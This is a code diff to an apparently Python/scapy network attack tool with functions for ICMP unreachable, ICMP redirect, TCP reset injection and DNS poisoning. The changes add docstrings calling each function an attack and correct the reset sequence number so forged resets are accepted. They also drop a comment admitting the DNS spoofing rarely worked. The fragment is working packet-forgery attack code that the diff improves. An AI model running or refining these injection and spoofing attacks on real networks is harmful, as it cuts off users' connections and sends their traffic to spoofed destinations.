@@ -6,6 +6,10 @@ arp_ban = False
 
 
 def icmp_unreachable(p: Packet):
+    """
+    ICMP Unreachable attack
+    :param p: scapy packet
+    """
     if p.haslayer(inet.ICMP) and p[inet.ICMP].type in [3, 5]:
         return
     if p.haslayer(inet6.ICMPv6ND_NA) or p.haslayer(inet6.ICMPv6DestUnreach) or p.haslayer(inet6.ICMPv6ND_Redirect):
@@ -18,6 +22,10 @@ def icmp_unreachable(p: Packet):
 
 
 def icmp_redirect(p: Packet):
+    """
+    ICMP Redirect attack
+    :param p: scapy packet
+    """
     if p.haslayer(inet.ICMP) and p[inet.ICMP].type in [3, 5]:
         return
     if p.haslayer(inet6.ICMPv6ND_NA) or p.haslayer(inet6.ICMPv6DestUnreach) or p.haslayer(inet6.ICMPv6ND_Redirect):
@@ -38,11 +46,11 @@ def tcp_rst(p: Packet):
     if not p.haslayer(inet.TCP) or not p[inet.TCP].flags.A:
         return
 
-    seq = p[inet.TCP].seq
+    seq = p[inet.TCP].seq + len(p[inet.TCP].payload)
     ack = p[inet.TCP].ack
     sport = p[inet.TCP].sport
     dport = p[inet.TCP].dport
-    if p.haslayer(inet.IP):
+    if p[l2.Ether].type == 2048:
         src = p[inet.IP].src
         dst = p[inet.IP].dst
         exp1 = inet.IP(src=src, dst=dst) / inet.TCP(sport=sport, dport=dport, seq=seq, window=0, flags=4)
@@ -60,7 +68,6 @@ def tcp_rst(p: Packet):
 def dns_poison(p: Packet):
     """
     DNS poisoning (spoofing) attack
-    Not working in most of the time due to our delay
     :param p: packet for generate attack exploit
     """
     if not p.haslayer(dns.DNS) or p.haslayer(dns.DNSRR) or not p.haslayer(inet.UDP):
